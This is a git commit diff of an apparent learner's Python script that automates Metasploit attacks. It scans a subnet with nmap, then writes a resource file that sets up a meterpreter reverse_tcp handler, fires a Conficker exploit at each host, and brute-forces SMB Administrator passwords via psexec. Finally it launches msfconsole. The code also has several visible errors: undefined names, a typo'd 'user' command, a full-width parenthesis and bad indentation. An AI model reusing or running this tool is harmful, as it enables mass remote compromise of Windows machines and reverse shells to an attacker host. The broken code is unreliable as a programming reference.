334819d1c0c11f7b0c2f3c9e3f0f21d8ed44a7b7
NanJunLee <NanJun05@163.com>
2016-11-02 13:50:40 +0800

    modify

--- PythonTraining/Metasploit.py
+++ PythonTraining/Metasploit.py
@@ -1,3 +1,6 @@
+import os
+import optparse
+import sys
 import nmap
 
 def findTgts(subNet):
@@ -16,7 +19,7 @@ def findTgts(subNet):
 
 def setupHandler(configFile, lhost, lport):
 
-	configFile.write('use exploit/mulit/handler\n')
+	configFile.write('use exploit/multi/handler\n')
 	configFile.write('set PAYLOAD ' +\
 		'windows/meterpreter/reverse_tcp\n')
 	configFile.write('set LPORT ' + str(lport) + '\n')
@@ -33,4 +36,77 @@ def confickerExploit(configFile, tgtHost, lhost, lport):
 	configFile.write('set LPORT ' + str(lport) + '\n')
 	configFile.write('set LHOST ' + lhost + '\n')
 	configFile.write('exploit -j -z\n')
-	
+
+def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
+
+	username = 'Administrator'
+	pF = open(passwdFile, 'r')
+
+	for password in pF.readlines():
+
+		password = password.strip('\n').strip('\r')
+		configFile.write('user exploit/windows/smb/psexec\n')
+		configFile.write('set SMBUser ' + str(username) + '\n')
+		configFile.write('set SMBPass ' + str(password) + '\n')
+		configFile.write('set RHOST ' + str(tgtHOst) + '\n')
+		configFile.write('set PAYLOAD ' +\
+			'windows/meterpreter/reverse_tcp\n')
+		configFile.write('set LPORT ' + str(lport) + '\n')
+		configFile.write('set LHOST ' + lhost + '\n')
+		configFile.write('exploit -j -z\n')
+
+def main():
+
+	configFile = open('meta.rc', 'w')
+
+	parser = optparse.OptionParser('[-] Usage%prog '+\
+		'-H <RHOST[s]> -1 <LHOST> [-p <LPORT> -F <Password File>]')
+	parser.add_option('-H', dest='tgtHost', type='string', \
+		help='specify the target address[es]')
+	parser.add_option('-p', dest='lport', type='string', \
+		help='specify the listen port')
+	parse.add_option('-l', dest='lhost', type='string', \
+		help='specify the listen port')
+	parse.add_option('-F', dest='passwdFile', type='string', \
+		help='password file for SMB brute force attempt')
+
+	(options, args) = parser.parse_args()
+
+	if (options.tgtHost == None) | （options.lhost == None):
+	print parse.usage
+	exit(0)
+
+	lhost = options.lhost
+	lport = options.lport
+	if lport == None:
+		lport = '1337'
+
+	passwdFile = options.passwdFile
+	tgtHosts = findTgts(options.tgtHost)
+	setupHandler(configFile, lhost, lport)
+
+	for tgtHost in tgtHosts:
+		confickerExploit(configFile, tgtHost, passwdFile, lhost, lport)
+		if passwdFile != None:
+			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
+	configFile.close()
+	os.system('msfconsole -r meta.rc')
+
+if __name__ == '__main__':
+	main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
